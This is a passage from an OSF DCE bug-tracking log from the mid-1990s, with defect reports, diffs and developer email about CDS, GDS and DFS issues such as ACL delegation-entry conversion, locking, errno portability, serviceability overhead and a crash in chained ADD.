>   sprintf(databuf, "checkbintime %d %d %d %d %d\n", bossvr_nextDayKT.mask,
-----[deleted 1164-1166 after 1157]-----
<   strcpy(databuf , dcesptr);
<   free(dcesptr);
<   }



CR Number                     : 12744
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : server
Short Description             : delegation entries
not converted to foreign in change_default()
Reported Date                 : 11/9/94
Found in Baseline             : 1.1
Found Date                    : 11/9/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : directory/cds/server/back_skulk.c
Diff supplied by              : provider
Diff release                  : 1.2.2
Sensitivity                   : public

[11/9/94 public]

Not much else to say.  Delegation entries are overlooked in
change_default() in back_skulk.c when converting an ACL to a
new realm, they should be converted to foreign delegate but 
they're left alone.

[12/6/96 public]

Here are the diffs with

< : R1.2.2b4 version
> : fixs

Also, there is another fix included which is acl-related involving calling
cds_dacl.c:dacl_lookup_from_master().  See OT 13427 for diffs on cds_dacl.c.

back_skulk.c
------------
9a10,13
>  * Fix for OT 12744 - deal with delegation entries in change_default().
>  *
>  * Also, when we skulk a new directory, always go to the master copy of the
>  * parent directory to inherit the acls.
321,322c325
<     for (i=0; i<from_p->num_entries; ++i)
<         {
---
>     for (i=0; i<from_p->num_entries; ++i) {
324,352c327,352
<         switch (entry_p->entry_info.entry_type)
<             {
<             case sec_acl_e_type_user:
<                 entry_p->entry_info.entry_type = sec_acl_e_type_foreign_user;
<                 entry_p->entry_info.tagged_union.foreign_id.id =
<                     entry_p->entry_info.tagged_union.id;
<                 entry_p->entry_info.tagged_union.foreign_id.realm =
<                     from_p->default_realm;
<                 break;
<             case sec_acl_e_type_group:
<                 entry_p->entry_info.entry_type = sec_acl_e_type_foreign_group;
<                 entry_p->entry_info.tagged_union.foreign_id.id =
<                     entry_p->entry_info.tagged_union.id;
<                 entry_p->entry_info.tagged_union.foreign_id.realm =
<                     from_p->default_realm;
<                 break;
<             case sec_acl_e_type_other_obj:
<                 entry_p->entry_info.entry_type = sec_acl_e_type_foreign_other;
<                 entry_p->entry_info.tagged_union.foreign_id.id =
<                     from_p->default_realm;
<                 break;
<             case sec_acl_e_type_foreign_other:
<                 if (uuid_equal(&entry_p->entry_info.tagged_union.id.uuid,
<                         &to_p->default_realm.uuid, &status))
<                     entry_p->entry_info.entry_type = sec_acl_e_type_other_obj;
<                 break;
<             case sec_acl_e_type_foreign_user:
<                 if (uuid_equal(
< &entry_p->entry_info.tagged_union.foreign_id.realm.uuid,
---
>         switch (entry_p->entry_info.entry_type) {
> 
>         case sec_acl_e_type_user:
>           entry_p->entry_info.entry_type = sec_acl_e_type_foreign_user;
>           entry_p->entry_info.tagged_union.foreign_id.id =
>             entry_p->entry_info.tagged_union.id;
>           entry_p->entry_info.tagged_union.foreign_id.realm =
>             from_p->default_realm;
>           break;
> 
>         case sec_acl_e_type_group:
>           entry_p->entry_info.entry_type = sec_acl_e_type_foreign_group;
>           entry_p->entry_info.tagged_union.foreign_id.id =
>             entry_p->entry_info.tagged_union.id;
>           entry_p->entry_info.tagged_union.foreign_id.realm =
>             from_p->default_realm;
>           break;
> 
>         case sec_acl_e_type_other_obj:
>           entry_p->entry_info.entry_type = sec_acl_e_type_foreign_other;
>           entry_p->entry_info.tagged_union.foreign_id.id =
>             from_p->default_realm;
>           break;
> 
>         case sec_acl_e_type_foreign_user:
>           if (uuid_equal(&entry_p->entry_info.tagged_union.foreign_id.realm.uuid,
354,362c354,362
<                     {
<                     entry_p->entry_info.entry_type = sec_acl_e_type_user;
<                     entry_p->entry_info.tagged_union.id =
<                         entry_p->entry_info.tagged_union.foreign_id.id;
<                     }
<                 break;
<             case sec_acl_e_type_foreign_group:
<                 if (uuid_equal(
<                  &entry_p->entry_info.tagged_union.foreign_id.realm.uuid,
---
>             {
>                 entry_p->entry_info.entry_type = sec_acl_e_type_user;
>                 entry_p->entry_info.tagged_union.id =
>                   entry_p->entry_info.tagged_union.foreign_id.id;
>             }
>           break;
> 
>         case sec_acl_e_type_foreign_group:
>           if (uuid_equal(&entry_p->entry_info.tagged_union.foreign_id.realm.uuid,
364,379c364,444
<                     {
<                     entry_p->entry_info.entry_type = sec_acl_e_type_group;
<                     entry_p->entry_info.tagged_union.id =
<                         entry_p->entry_info.tagged_union.foreign_id.id;
<                     }
<                 break;
<             case sec_acl_e_type_user_obj:
<             case sec_acl_e_type_group_obj:
<             case sec_acl_e_type_extended:
<             case sec_acl_e_type_unauthenticated:
<             case sec_acl_e_type_any_other:
<             case sec_acl_e_type_mask_obj:
<             default:
<                 break;
<             } /* end switch */
<         } /* End looping through acl entries */
---
>             {
>                 entry_p->entry_info.entry_type = sec_acl_e_type_group;
>                 entry_p->entry_info.tagged_union.id =
>                   entry_p->entry_info.tagged_union.foreign_id.id;
>             }
>           break;
> 
>         case sec_acl_e_type_foreign_other:
>           if (uuid_equal(&entry_p->entry_info.tagged_union.id.uuid,
>                          &to_p->default_realm.uuid, &status))
>             entry_p->entry_info.entry_type = sec_acl_e_type_other_obj;
>           break;
> 
>         case sec_acl_e_type_user_deleg:
>           entry_p->entry_info.entry_type = sec_acl_e_type_for_user_deleg;
>           entry_p->entry_info.tagged_union.foreign_id.id =
>             entry_p->entry_info.tagged_union.id;
>           entry_p->entry_info.tagged_union.foreign_id.realm =
>             from_p->default_realm;
>           break;
> 
>         case sec_acl_e_type_group_deleg:
>           entry_p->entry_info.entry_type = sec_acl_e_type_for_group_deleg;
>           entry_p->entry_info.tagged_union.foreign_id.id =
>             entry_p->entry_info.tagged_union.id;
>           entry_p->entry_info.tagged_union.foreign_id.realm =
>             from_p->default_realm;
>           break;
> 
>         case sec_acl_e_type_other_obj_deleg:
>           entry_p->entry_info.entry_type = sec_acl_e_type_for_other_deleg;
>           entry_p->entry_info.tagged_union.foreign_id.id =
>             entry_p->entry_info.tagged_union.id;
>           entry_p->entry_info.tagged_union.foreign_id.realm =
>             from_p->default_realm;
>           break;
> 
>         case sec_acl_e_type_for_user_deleg:
>           if (uuid_equal(&entry_p->entry_info.tagged_union.foreign_id.realm.uuid,
>                            &to_p->default_realm.uuid, &status))
>             {
>                 entry_p->entry_info.entry_type = sec_acl_e_type_user_deleg;
>                 entry_p->entry_info.tagged_union.id =
>                   entry_p->entry_info.tagged_union.foreign_id.id;
>             }
>           break;
> 
>         case sec_acl_e_type_for_group_deleg:
>           if (uuid_equal(&entry_p->entry_info.tagged_union.foreign_id.realm.uuid,
>                            &to_p->default_realm.uuid, &status))
>             {
>                 entry_p->entry_info.entry_type = sec_acl_e_type_group_deleg;
>                 entry_p->entry_info.tagged_union.id =
>                   entry_p->entry_info.tagged_union.foreign_id.id;
>             }
>           break;
> 
>         case sec_acl_e_type_for_other_deleg:
>           if (uuid_equal(&entry_p->entry_info.tagged_union.foreign_id.realm.uuid,
>                            &to_p->default_realm.uuid, &status))
>             {
>                 entry_p->entry_info.entry_type = sec_acl_e_type_other_obj_deleg;
>                 entry_p->entry_info.tagged_union.id =
>                   entry_p->entry_info.tagged_union.foreign_id.id;
>             }
>           break;
>           
>         case sec_acl_e_type_user_obj:
>         case sec_acl_e_type_group_obj:
>         case sec_acl_e_type_extended:
>         case sec_acl_e_type_unauthenticated:
>         case sec_acl_e_type_any_other:
>         case sec_acl_e_type_mask_obj:
>         case sec_acl_e_type_user_obj_deleg:
>         case sec_acl_e_type_group_obj_deleg:
>         case sec_acl_e_type_any_other_deleg:
>         default:
>           break;
>           
>       } /* end switch */
>     } /* End looping through acl entries */
433,434c498,499
<         status = dacl_lookup(parent_p, &flatcontainer_p, &containerlen,
<                            sec_acl_type_default_container);
---
>         status = dacl_lookup_from_master(parent_p, &flatcontainer_p, &containerlen,
>                                        sec_acl_type_default_container);
534,535c599,600
<         status = dacl_lookup(parent_p, &flatobject_p, &objectlen,
<                            sec_acl_type_default_object);
---
>         status = dacl_lookup_from_master(parent_p, &flatobject_p, &objectlen,
>                                        sec_acl_type_default_object);



CR Number                     : 12743
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : library
Short Description             : there's a potential for a client
application to hang during a call to cds.
Reported Date                 : 11/9/94
Found in Baseline             : 1.1
Found Date                    : 11/9/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/9/94 public]
In cds_send() in dnssend.c, the following code should be 
enveloped by a DNS_LOCK/DNS_END_LOCK :

	/* finished sending request */
	cds_writer_p = NULL;
	pthread_cond_signal(&cds_no_writer);



CR Number                     : 12741
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : hpux
Component Name                : cds
Subcomponent Name             : 
Short Description             : name length assertion failure when starting.
Reported Date                 : 11/2/94
Found in Baseline             : 1.1b24
Found Date                    : 11/2/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/2/94 public]

When starting up a secd, cdsd, fldb server with rc.dce, I sometimes get:
1994-11-02-14:52:26.122-05:00I----- cdsclerk(1395) FATAL cds adver dceassert.c 63 0x401949b8
Assertion "nameLen <= a2" failed in "/project/dce/build/unintegrated-snap/src/directory/cds/library/deb_ascii.c"file> line <698

Also:
rm /opt/dcelocal/var/adm/directory/cds/cds_cache.*
has been added to rc.dce

Setting debug level to 7 for cds in the routing file seems to cure this
problem.



CR Number                     : 12733
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : 
Short Description             : Remove -g from Makefiles
Reported Date                 : 10/26/94
Found in Baseline             : 1.1b19
Found Date                    : 10/26/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/26/94 public]
From Rob Stanzel.  Remove the -g in:

admin/dced/server/Makefile:
    # Remove this line when all the bugs are gone:
    CC_OPT_LEVEL = -g

and admin/dced/api/Makefile:

    # compiler flags
    CFLAGS                  = ${${TARGET_MACHINE}_CFLAGS}  \
			      ${STRICT_COMPILER_WARNINGS} -g



CR Number                     : 12724
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : userInt/fts
Short Description             : Using osi_err[En|De]code()
Reported Date                 : 10/25/94
Found in Baseline             : 1.1
Found Date                    : 10/25/94
Severity                      : B
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : volc*.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/2/96 public]
lowering priority of old OTs that haven't appeared during R1.2.

[10/25/94 public]
 
From a support customer working with OpenEdition MVS:
 
> Full Description:
> 
>         Code in the fts program checks return codes from RPCs for ENOENT,
>         ENODEV, and EXDEV.  These values are system-dependent and should
>         not be passed over the wire from server to client.  In our
>         particular case, the ftserver is running on OpenEdition MVS and
>         the client is an RS/6000 running AIX and the OSF reference
>         platform 1.0.3a fts command.  An 'fts move' command to move a
>         fileset between two aggregates on MVS fails because we return
>         EXDEV during the check for the presense of the fileset on the
>         destination aggregate, but the OpenEdition value for EXDEV is
>         not recognized by the AIX client which fails the move operation.
> 
>         We have *not* investigated whether this is a problem with other
>         client-server relationships such as bos <=> bosserver.
> 
> Proposed Solution:
> 
>         The osi_errEncode() and osi_errDecode() routines should be used
>         on both sides of this interface so that a common set of errno
>         values is passed between server and client.
 
I don't know whether this constitutes a defect or a disagreement over 
error conversion policy (I note a repeated allusion in the RCS comments 
to a design document dealing with the latter).  A cursory survey of the 
DFS code does indicate some inconsistency as to when raw error codes (as 
per "sys/errno.h") are returned, and when they are passed through the 
"osi_err[En|De]code" routines.  The following data may give some 
indication of the scope of the question.
 
"osi_errEncode" and/or "osi_errDecode" occur in the following files:
 
	cm/cm_cell.c
	cm/cm_conn.c
	cm/cm_daemons.c
	cm/cm_dcache.c
	cm/cm_dnamehash.c
	cm/cm_pioctl.c
	cm/cm_rrequest.c
	cm/cm_scache.c
	cm/cm_server.c
	cm/cm_subr.c
	cm/cm_tknimp.c
	cm/cm_tokens.c
	cm/cm_vnodeops.c
	cm/cm_volume.c
	fsprobe/fsprobe.c
	osi/OSF1/osi_dfs2osferr.c
	osi/OSF1/osi_osf2dfserr.c
	osi/RIOS/osi_aix2dfserr.c
	osi/RIOS/osi_dfs2aixerr.c
	px/px_intops.c
	rep/rep_main.c
	userInt/fts/volc_tokens.c
 
"return [ENOENT|ENODEV|EXDEV]" occurs in the following files:
	
	butc/list.c
	cm/cm_conn.c
	cm/cm_daemons.c
	cm/cm_dnamehash.c
	cm/cm_init.c
	cm/cm_pioctl.c
	cm/cm_rrequest.c
	cm/cm_server.c
	cm/cm_subr.c
	cm/cm_vdirent.c
	cm/cm_vfsops.c
	cm/cm_vnodeops.c
	cm/cm_volume.c
	dfsbind/bind_helper.c
	episode/async/asevent.c
	episode/async/us_io.c
	episode/dir/dir_main.c
	episode/vnops/efs_agops.c
	episode/vnops/efs_dir.c
	ftutil/ftu_util.c
	icl/icl_control.c
	tkset/tkset.c
	ufsops/HPUX/hpux_volops.c
	ufsops/RIOS/aix_volops.c
	ufsops/ufs_agops.c
	ufsops/ufs_volops.c
	userInt/fts/volc_tokens.c
	userInt/fts/volc_vldbsubr.c
	xaggr/ag_init.c
	xaggr/ag_registry.c
	xvnode/RIOS/xvfs_aixglue.c
	xvolume/vol_init.c
 
I'd like to be able to give this customer some kind of feedback on this,
even if it's just "talk to your vendor" or "you want 'em, you put 'em in".
 
				Thanks,
 
				Jim

[10/26/94 public]
Sounds like a problem with backwards compat concerns if
you fix it, but I'm a lame duck.  You need to talk to TA.  
I've included Craig E. on the interest list.

[10/26/94 public]
There isn't much of a backwards-compatibility problem, since you're
eliminating the issue for the inter-architecture case and only confusing
communication between same-architecture, old-vs-new clients and servers.
 
The right kind of check isn't so much to look for explicit returns
of error codes, but to sanitize the error codes across RPC interfaces.
This is best done in the manager procedures themselves, and decoded by
the RPC callers uniformly.
 
I admit that it never occured to any of us that the first few errno
values would ever be platform-dependent; we concentrated efforts on
the higher-numbered values like ETIMEDOUT or ESTALE.  I guess that's
not enough.
 
Certainly the vendor's port can do this independently of others.  Perhaps
it's a cleanup item that can be attached to DCE 1.2.



CR Number                     : 12712
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : Cds takes performance hit on serviceavility
Reported Date                 : 10/24/94
Found in Baseline             : 1.1b10
Found Date                    : 10/24/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/24/94 public]

Cds takes performance hit on serviceability.

See the enclosed three E-mails from hsiao and jd. Hsiao reported this 
performance bug in the first two and, in the last one, jd gave some 
clue as to how to fix it.

++++++++++++++++++++++++

::::::::::::::
inbox/1159
::::::::::::::
From hsiao@osf.org Thu Jul 14 15:44:42 1994
Received: from mailbox.osf.org (mailbox.osf.org [130.105.1.8]) by postman.osf.org (8.6.9/8.6.x) with ESMTP
	id PAA08792; Thu, 14 Jul 1994 15:43:45 -0400
Received: from postman.osf.org (postman [130.105.1.152]) by mailbox.osf.org (8.6.5/8.6.x) with ESMTP
	id PAA06906 for <dce-team@osf.org>; Thu, 14 Jul 1994 15:43:41 -0400
From: hsiao@osf.org
Received: from toaster.osf.org (toaster.osf.org [130.105.5.104]) by postman.osf.org (8.6.9/8.6.x) with SMTP
	id PAA08756; Thu, 14 Jul 1994 15:43:36 -0400
Message-Id: <199407141943.PAA08756@postman.osf.org>
X-Authentication-Warning: postman.osf.org: Host toaster.osf.org didn't use HELO protocol
To: jd@osf.org, rsalz@osf.org, hathaway@osf.org, blazin@osf.org
cc: dce-team@osf.org
Subject: Cdsd takes a performance hit on serviceability
Date: Thu, 14 Jul 94 15:42:15 EDT

Summary

1.0	The following cdscp test has jumped from ~20 seconds
	to ~35 seconds from dce 1.0.3 to dce 1.1. Cdsd and
	cdsclerk increased their CPU costs from 9 and 10 seconds
	to 18 and 16 seconds respectively.

2.0	Further investigations with user profiling of cdsd 
	indicated that the big increase in it's CPU cost 
	from dce1.0.3 to dce1.1 was mainly due to overhead in 
	serviceability.  

	For example, the two cds serviceability functions, 
	deb_ascii_ObjUID and deb_ascii_AttributeName with their 
	decendants take about 25% of the cdsd's CPU time.

3.0	We'll re-run the same test with no serviceability in cds.	

Test

	This cdsp test is to stress the server and the clerk:

		cdscp >
			set cdscp conf = high
			show dir /.: (10 times)
			q

Platform --- HP

DCE --- dce1.0.3 and dce1.1 bl-10

Cell --- Single node cell
	 

::::::::::::::
inbox/1192
::::::::::::::
From hsiao@osf.org Fri Jul 15 10:02:58 1994
Received: from toaster.osf.org (toaster.osf.org [130.105.5.104]) by postman.osf.org (8.6.9/8.6.x) with SMTP
	id KAA00224; Fri, 15 Jul 1994 10:02:57 -0400
Message-Id: <199407151402.KAA00224@postman.osf.org>
X-Authentication-Warning: postman.osf.org: Host toaster.osf.org didn't use HELO protocol
To: jd, hathaway, blazin
cc: hsiao
Subject: RE: Cdsd takes a performance hit on serviceability
Date: Fri, 15 Jul 94 10:01:41 EDT
From: hsiao@osf.org

>Summary
>
>1.0     The following cdscp test has jumped from ~20 seconds
>        to ~35 seconds from dce 1.0.3 to dce 1.1. Cdsd and
>        cdsclerk increased their CPU costs from 9 and 10 seconds
>        to 18 and 16 seconds respectively.
>
>2.0     Further investigations with user profiling of cdsd 
>        indicated that the big increase in it's CPU cost 
>        from dce1.0.3 to dce1.1 was mainly due to overhead in 
>        serviceability.  
>
>        For example, the two cds serviceability functions, 
>        deb_ascii_ObjUID and deb_ascii_AttributeName with their 
>        decendants take about 25% of the cdsd's CPU time.
>
>3.0     We'll re-run the same test with no serviceability in cds.
>
>

	I built src from scatch with DCE_DEBUG undefined in dce.h. With
	DCE_DEBUG undefined cds can be built with no serviceabilty. But,
	the build failed on cdsd and I'll file an OT against cds --- 
	fileBuf undefined in cds/server/ db_compression.c.

	The clerk was successfully built and I ran the cdscp test with
	two versions of cdsclerk --- DEBUG on and off --- and the
	DEBUG-off version used ~10 seconds of HP CPU verus ~16 seconds for
	the DEBUG-on version.


::::::::::::::
inbox/5479
::::::::::::::
From jd@osf.org Mon Oct 24 12:43:56 1994
Received: from vanilla.qadce.osf.org.osf.org (vanilla.osf.org [130.105.5.44]) by postman.osf.org (8.6.9/8.6.x) with SMTP
	id MAA25062; Mon, 24 Oct 1994 12:43:42 -0400
Received: by vanilla.qadce.osf.org.osf.org (1.37.109.4/4.7) id AA07271; Mon, 24 Oct 94 12:42:10 -0400
Date: Mon, 24 Oct 94 12:42:10 -0400
From: jd@osf.org
Message-Id: <9410241642.AA07271@vanilla.qadce.osf.org.osf.org>
To: jd@osf.org
Cc: dce-team, dce-tech, hsiao@osf.org, xander@austin.ibm.com
Subject: Re: Cdsd takes a performance hit on serviceability 
In-Reply-To: <9410241625.AA07170@vanilla.qadce.osf.org.osf.org>
References: <199410241553.LAA22225@postman.osf.org>
	<9410212203.AA24290@yucca.austin.ibm.com>
	<9410241625.AA07170@vanilla.qadce.osf.org.osf.org>



I thought there already was a macro that allowed you to check that the
debug level is at least at a certain level for a component or subcomponent
prior to invoking the call that takes the hit. There is and its called 
DCE_SVC_DEBUG_ATLEAST. Its in dce/utisl/svc/dce_svc.h. It probably wouldn't
take much to change all of the cds debug serviceability calls to make use of 
this macro. 

                        John



jd@osf.org writes:
 > 
 > 
 > Its not dynamic. Many of the debug servicability calls have calls in 
 > their argument lists that do internal data structure to ascii conversions.
 > Since the decision to print or not to print isn't made until after the
 > arguments are already called you get the overhead regardless of the debug
 > level turned on in the routing file. This only affects you if you have
 > build with CDS_DEBUG turned on which in turn deppends on DCE_DEBUG in dce.h.
 > One could of course surround the debug servicability calls themselves with
 > a macro which does a check on debug levels before looking at the call at 
 > all. The current code does not do this but vendors can certainly do it
 > if they are interested in shiping product with these servicability calls
 > compiled in.
 > 
 > 
 >                           John
 > 
 > 
 > hsiao@osf.org writes:
 >  > >Jean,
 >  > >
 >  > >Is there an OT opened against the performance of CDS with serviceability?  
 >  > >
 >  > >I do not know anything about this serviceability stuff, but I would hope 
 >  > >that it could be disabled dynamically, much like auditing on secure UNIX
 >  > >systems.  Maybe the workaround is as eaasy as that!
 >  > >
 >  > >Thanks,
 >  > >Xander
 >  > >
 >  > >-- 
 >  > > Alexander T. Fleming,    IBM Corporation,      PSP LAN Systems 
 >  > > 11400 Burnet Road,     Mailstop 9132,      Austin, Texas 78758
 >  > > Internet: xander@austin.ibm.com      Telephone: (512) 838-7914 
 >  > >
 >  > 
 >  > Alexander,
 >  > 
 >  > 	The overhead is always there without any CDS servieability
 >  > 	point turned on. The best thing we can do now is to compile with 
 >  > 	DCE_DEBUG off. I'll file an enhancement OT against it.
 >  > 
 >  > 	Thanks for reminding me.
 >  > 
 >  > Jean
 >  >



CR Number                     : 12711
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : gds
Subcomponent Name             : xds
Short Description             : XDS accepts typeless global cell names
Reported Date                 : 10/24/94
Found in Baseline             : 1.0.3
Found Date                    : 10/24/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/24/94 public]

IBM reported the following problem:

"
   If an application passes to XDS interface the following directory
   name :

          /.../85.4.6 = 'dcecell'/cdsname

   the XDS interface correctly recognizes this name as a CDS name,
   as it has a typeless portion, and calls CDSPI to process the
   request. The resulting CDS name is '/.../c=dcecell/cdsname'.

   If, on another hand, an application passes to XDS interface the
   name:

         /.../43.22.1.2.2 = 'c=dcecell'/cdsname

   the XDS interface strips the typeless OID 43.22.1.2.2 and calls
   the CDSPI with the same CDS name '/.../c=dcecell/cdsname'.
   In this scenario, we have a global cell name (typed) passed to
   XDS subsystem as an untyped name, and recognized by CDS as a
   typed cell name again. Even though the name is resolved correctly
   this is not a valid way of passing a typed cell name to CDS.

Proposed Solution:

   A user should not be able to specify a global name with typeless
   OID specifier.

"

I think what happens is that since 43.22.1.2.2 means Typeless-RDN-for-CDS,
XDS assumes that the rest name is part of CDS and calls CDSPI.

I will let experts to decide what we want to do here: whether to disallow
such practice, or make it s doc note, or sth else.



CR Number                     : 12697
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : gdad
Short Description             : gdad doesn't unbind after X.500
name resolution
Reported Date                 : 10/21/94
Found in Baseline             : 1.1
Found Date                    : 10/21/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/21/94 public]

David Truong @ HP reports:

---
I've just found a problem with GDA process (DCE 1.1).  Here is what I did:    
  1) I set up a single cell name hp.com on system A and also start GDA process.
  2) I set up a single cell name c=us/o=hp/ou=cupertino on system B.
  3) On system A I configured all CDS objects in GDS.               
  4) On system A I run command: "cdscp sho cell /.../c=us/o=hp/ou=cupertino"
     and cdscp sho dir /.../c=us/o=hp/ou=cupertino/subsys, all works fine.
  5) On system A I try to shutdown GDS by run command "gdssysadm -fd"
     and it tells me the GDS processes are still in used.
  6) I waited and waited then type command "gdsdirinfo", it shows:

#       PROCTYPE    PID    DIRID    IPCID    STATE
#
        Monitor     5530     -        5        -
        DUA-Cache   5534     -        1        -
        C-Stub      5536     -        2        -
        S-Stub      5538     1        11       -
        DSA         5540     1        31       -
        DSA         5543     1        31       -
        Dir-User    5352     -        31       R10

Process "Dir-User" never got released from "R10" state.

I think this is a bug in the GDA process.  When CDS request lookup to GDA, 
then GDA bind to XDS to look for CDS information stored in GDS and forget
to unbind when it's done.

When I manually kill 'gdad' process then it removes "Dir-User" from gdsdirinfo.
---

I have reproduced this at OSF.



CR Number                     : 12695
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : gds
Subcomponent Name             : dsa
Short Description             : chained ADD doesn't work
Reported Date                 : 10/21/94
Found in Baseline             : 1.1
Found Date                    : 10/21/94
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : gds/dsa/addob.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/21/94 public]

You can't add an object via DSP.
To verify this use the gds configuration as it is used in the FVT
and run the following gdscp script:

bind -dirid 2 -dsa /C=de/O=dbp/OU=dap11/CN=dsa/CN=dsa-m2
x500svc modify -preferchain TRUE -chainingprohibited FALSE
create /C=de/O=dbp/OU=dap11/CN=jochen -attr OCL=ORP SN=abc


DSA on dirid 2 will dump core.
The fix is very easy - just move a line "free (sm_in)" (in addob.c)
from line 555 to some lines later.

[10/25/94 public]
This is the "diff addob.c.new addob.c.old":

544a545
>   free(sm_in);
565d565
<   free(sm_in);

[10/25/94 public]
This is "diff -C 10 addob.c.new addob.c.old":


*** /project/dce/build/dce1.1/src/directory/gds/dsa/addob.c	Wed Oct  5 09:00:06 1994
--- addob.c	Tue Oct 25 15:34:41 1994
***************
*** 545,565 ****
  			       (byte **) a_out,
  			       &rem_len,sup_exact_name, attr, sup_oct_idx,
  			       acl_sup, &mk_sup, &rec,&record, &al_flag, &i);
  
  if                                  /*  search was not successful     */
     ((search_ret_val != D2_NOERROR && op_id > D2_ADM_OPID) ||
      (op_id < D2_ADM_OPID && (search_ret_val != D2_NOERROR &&
  				 search_ret_val != D2_REF_ERROR)))
  
  {                                   /*  unlock used files             */
-   free(sm_in);
    if                /*  no result present                         */
       (search_ret_val == D2_REF_ERROR)
    {                 /*  write the error referrals                 */
      if (nm_compl)
      {
        d26_referral->d26_new_rdn = (D2_name_string) obj_name;
      }
      if              /*  hard error from writing referrals         */
        (d26_u63_write_error_referral(a_out,length, &rem_len,  d26_referral) !=
  								D2_NO_ERR)
--- 545,564 ----
***************
*** 566,585 ****
--- 565,585 ----
      {               /*  set  error apdu                           */
         d27_010_set_error_apdu((D23_rserror *)*a_out,D2_TEMP_ERR,
  			      D2_REM_ERR,D2_UNWILLING,&meslen);
         rem_len = *length - meslen;
       }               /*                                            */
     }                 /*                                            */
    d26_u41_free_referrals();
    d26_i14_unlock();
    *length -= rem_len;
    DCE_SVC_LOG((GDS_S_EXIT_FUNCTION_MSG,function,D26_ERROR - 15));
+   free(sm_in);
    return(D26_ERROR);
  } else if                               /*  superior is alias entry       */
        (al_flag == TRUE)
  {                                   /*  set error message             */
  				    /*  return(D26_ERROR)             */
    d27_010_set_error_apdu((D23_rserror *) *a_out, D2_CALL_ERR, D2_PAR_ERR,
  			 D2_NAMING_VIOLATION, length);
  				    /*  unlock used files             */
    d26_i14_unlock();
    DCE_SVC_LOG((GDS_S_EXIT_FUNCTION_MSG,function,D26_ERROR - 16));



CR Number                     : 12690
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 12389
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : gds
Subcomponent Name             : gdscp
Short Description             : gdscp not showing cell information in a readable way
Reported Date                 : 10/20/94
Found in Baseline             : 1.1b23
Found Date                    : 10/20/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/20/94 public]

        I used gdssysadm/gdsditadm to add a cell's information into a dsa.
        Then I used gdscp to look at it, here is what I got:

gdscp> bind -dirid 2 -dsa /c=us/o=osf/ou=syseng/cn=dsa/cn=dsa-1
gdscp> show /c=us/o=osf/ou=syseng/cn=down
/C=us/O=osf/OU=syseng/CN=down {OCL=ORP;PER;TOP} CN=down SN=wang {CDC='\x33\x65\x
66\x30\x66\x62\x38\x31\x2d\x65\x62\x38\x61\x2d\x31\x31\x63\x64\x2d\x39\x64\x36\x
35\x2d\x30\x30\x30\x30\x63\x30\x33\x35\x37\x31\x34\x37\x00\x33\x65\x66\x30\x66\x
62\x38\x31\x2d\x65\x62\x38\x61\x2d\x31\x31\x63\x64\x2d\x39\x64\x36\x35\x2d\x30\x
30\x30\x30\x63\x30\x33\x35\x37\x31\x34\x37\x00\x2f\x2e\x2e\x2e\x2f\x63\x3d\x75\x
